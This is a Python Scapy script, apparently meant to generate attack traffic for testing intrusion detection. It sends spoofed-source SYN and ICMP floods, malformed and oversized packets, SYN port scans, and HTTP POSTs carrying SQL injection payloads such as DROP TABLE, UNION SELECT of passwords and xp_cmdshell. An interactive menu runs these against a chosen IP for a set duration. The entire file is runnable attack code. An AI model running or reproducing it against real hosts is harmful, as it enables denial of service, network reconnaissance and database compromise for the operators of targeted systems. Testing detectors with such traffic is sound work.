from scapy.all import IP, TCP, UDP, ICMP, Raw, send, RandIP, RandShort
import random
import time
import logging
from threading import Thread

class MaliciousTrafficGenerator:
    def __init__(self, interface="en0"):
        self.interface = interface
        self.running = False
        logging.basicConfig(level=logging.INFO)

    def craft_syn_flood(self, target_ip, target_port=80):
        """Enhanced SYN flood with realistic patterns"""
        packets = []
        for _ in range(random.randint(3, 7)):  # Burst of SYN packets
            ip = IP(dst=target_ip, src=RandIP())
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S",
                     seq=random.randint(1000, 9999))
            packets.append(ip/tcp)
        return packets

    def craft_ping_flood(self, target_ip):
        """Enhanced ICMP flood with various types"""
        packets = []
        try:
            # Create multiple ICMP packets with different characteristics
            for _ in range(random.randint(4, 8)):
                # Vary source IP and ICMP types
                ip = IP(dst=target_ip, src=RandIP())
                
                # More diverse ICMP packet types
                icmp_types = [
                    (8, 0),    # Echo Request
                    (13, 0),   # Timestamp Request
                    (17, 0),   # Information Request
                    (0, 0),    # Echo Reply
                ]
                
                icmp_type, icmp_code = random.choice(icmp_types)
                icmp_packet = ICMP(type=icmp_type, code=icmp_code)
                
                # Create the full packet
                full_packet = ip/icmp_packet
                packets.append(full_packet)
            
            return packets
        
        except Exception as e:
            logging.error(f"Error crafting ping flood packets: {e}")
            # Fallback to a simple ICMP packet
            return [IP(dst=target_ip, src=RandIP())/ICMP()]

    def craft_malformed_packet(self, target_ip):
        """Generate various types of malformed packets"""
        try:
            # Create multiple types of malformed packets
            malformed_packets = []
            
            # 1. Packet with unusual TCP flags
            ip1 = IP(dst=target_ip, src=RandIP())
            tcp1 = TCP(
                sport=RandShort(), 
                dport=random.randint(1, 65535),
                flags="FSRPAU"  # Unusual flag combination
            )
            malformed_packets.append(ip1/tcp1)
            
            # 2. Oversized packet
            ip2 = IP(dst=target_ip, src=RandIP())
            tcp2 = TCP(sport=RandShort(), dport=80)
            payload2 = Raw(load=b"\x00" * 1200)  # Slightly oversized
            malformed_packets.append(ip2/tcp2/payload2)
            
            # 3. Tiny packet with minimal payload
            ip3 = IP(dst=target_ip, src=RandIP())
            tcp3 = TCP(
                sport=RandShort(), 
                dport=80, 
                flags="S",
                window=0  # Unusual window size
            )
            malformed_packets.append(ip3/tcp3)
            
            # 4. Packet with invalid TCP options
            ip4 = IP(dst=target_ip, src=RandIP())
            tcp4 = TCP(
                sport=RandShort(), 
                dport=80, 
                options=[
                    ('MSS', 65535),  # Extremely large MSS
                    ('NOP', None), 
                    ('Timestamp', (0, 0))
                ]
            )
            malformed_packets.append(ip4/tcp4)
            
            # 5. UDP packet with unusual characteristics
            ip5 = IP(dst=target_ip, src=RandIP())
            udp5 = UDP(sport=RandShort(), dport=53, len=8)  # Minimal length
            malformed_packets.append(ip5/udp5)
            
            return random.choice(malformed_packets)
        
        except Exception as e:
            logging.error(f"Error crafting malformed packet: {e}")
            # Fallback to a simple malformed packet
            return IP(dst=target_ip, src=RandIP())/TCP(
                sport=RandShort(), 
                dport=random.randint(1, 65535), 
                flags="FSRPAU"
            )

    def craft_port_scan(self, target_ip):
        """IMPROVED port scanning patterns"""
        packets = []
        common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3389, 8080]
        src_ip = RandIP()._fix()  # Get a fixed random IP
        
        scan_ports = random.sample(common_ports, min(len(common_ports), 
                                                    random.randint(5, 8)))  # Increased port count
        base_port = random.randint(1, 1000)
        sequential_ports = [base_port + i for i in range(3)]  # 3 sequential ports
        scan_ports.extend(sequential_ports)  # Add sequential ports to the scan list
        
        for port in scan_ports:
            ip = IP(dst=target_ip, src=src_ip)  # Use same source IP for better detection
            tcp = TCP(sport=RandShort(), dport=port, flags="S")
            packets.append(ip/tcp)
        
        return packets

    def craft_large_packet(self, target_ip):
        """IMPROVED large packet generation"""
        packets = []
        src_ip = RandIP()._fix()  # Use consistent source IP for better detection
        
        for _ in range(3):  # Send multiple large packets
            # Large TCP packet
            tcp_size = random.randint(1400, 1800)  # Increased size
            ip1 = IP(dst=target_ip, src=src_ip)
            tcp = TCP(sport=RandShort(), dport=80)
            payload1 = Raw(load=b"X" * tcp_size)
            packets.append(ip1/tcp/payload1)
        
        for _ in range(2):
            udp_size = random.randint(1300, 1600)  # Increased size
            ip2 = IP(dst=target_ip, src=src_ip)
            udp = UDP(sport=RandShort(), dport=53)
            payload2 = Raw(load=b"X" * udp_size)
            packets.append(ip2/udp/payload2)
        
        ip3 = IP(dst=target_ip, src=src_ip)
        tcp3 = TCP(sport=RandShort(), dport=80)
        http_headers = (
            b"GET / HTTP/1.1\r\n"
            b"Host: example.com\r\n"
            b"User-Agent: Mozilla/5.0\r\n"
            b"Content-Type: application/x-www-form-urlencoded\r\n"
            b"Content-Length: 2000\r\n"
            b"\r\n"
        )
        http_content = b"X" * 2000
        packets.append(ip3/tcp3/Raw(load=http_headers + http_content))
        
        return packets

    def craft_sql_injection(self, target_ip):
        """Generate realistic SQL injection patterns"""
        packets = []
        injection_patterns = [
            b"admin' OR '1'='1'--",
            b"1; DROP TABLE users--",
            b"UNION SELECT username,password FROM users--",
            b"'; exec xp_cmdshell('net user')--",
            b"admin'); INSERT INTO logs VALUES('hacked')--"
        ]
        
        for pattern in random.sample(injection_patterns, 2):
            ip = IP(dst=target_ip, src=RandIP())
            tcp = TCP(sport=RandShort(), dport=80)
            http = (
                b"POST /login HTTP/1.1\r\n"
                b"Host: target\r\n"
                b"Content-Type: application/x-www-form-urlencoded\r\n"
                b"Content-Length: " + str(len(pattern)).encode() + b"\r\n"
                b"\r\n"
                b"username=" + pattern
            )
            packets.append(ip/tcp/Raw(load=http))
        
        return packets

    def simulate_attack(self, target_ip, duration=30, attack_type='random'):
        """Enhanced attack simulation with realistic patterns"""
        self.running = True
        end_time = time.time() + duration

        attack_functions = {
            'syn_flood': self.craft_syn_flood,
            'ping_flood': self.craft_ping_flood,
            'malformed': self.craft_malformed_packet,
            'port_scan': self.craft_port_scan,
            'large_packet': self.craft_large_packet,
            'sql_injection': self.craft_sql_injection
        }

        logging.info(f"Starting {attack_type} attack simulation against {target_ip}")

        try:
            while time.time() < end_time and self.running:
                if attack_type == 'random':
                    craft_packet = random.choice(list(attack_functions.values()))
                else:
                    craft_packet = attack_functions.get(attack_type)
                    if not craft_packet:
                        raise ValueError(f"Unknown attack type: {attack_type}")

                try:
                    packets = craft_packet(target_ip)
                    if not isinstance(packets, list):
                        packets = [packets]

                    for packet in packets:
                        try:
                            send(packet, verbose=False, count=1)
                            # Shorter delay for faster packet sending - important for detection
                            time.sleep(random.uniform(0.01, 0.1))  # Reduced delay
                        except Exception as send_error:
                            logging.warning(f"Send error for packet: {send_error}")
                
                except Exception as craft_error:
                    logging.error(f"Packet crafting error: {craft_error}")
                    continue

        except Exception as e:
            logging.error(f"Error in attack simulation: {e}")
        finally:
            self.running = False
            logging.info("Attack simulation completed")

    def start_attack_thread(self, target_ip, duration=30, attack_type='random'):
        """Start attack simulation in a separate thread."""
        attack_thread = Thread(target=self.simulate_attack, 
                             args=(target_ip, duration, attack_type))
        attack_thread.daemon = True
        attack_thread.start()
        return attack_thread

    def stop_attack(self):
        """Stop the ongoing attack simulation."""
        self.running = False
        logging.info("Stopping attack simulation...")

# Example usage
if __name__ == "__main__":
    generator = MaliciousTrafficGenerator()
    target = "192.168.1.8"  # Change to target IP
    
    print("Available attack types:")
    print("1. SYN Flood")
    print("2. Ping Flood")
    print("3. Malformed Packets")
    print("4. Port Scan")
    print("5. Large Packets")
    print("6. SQL Injection")
    print("7. Random Mix")
    
    choice = input("Select attack type (1-7): ")
    duration = int(input("Enter duration in seconds: "))
    
    attack_types = {
        '1': 'syn_flood',
        '2': 'ping_flood',
        '3': 'malformed',
        '4': 'port_scan',
        '5': 'large_packet',
        '6': 'sql_injection',
        '7': 'random'
    }
    
    attack_type = attack_types.get(choice, 'random')
    generator.simulate_attack(target, duration, attack_type)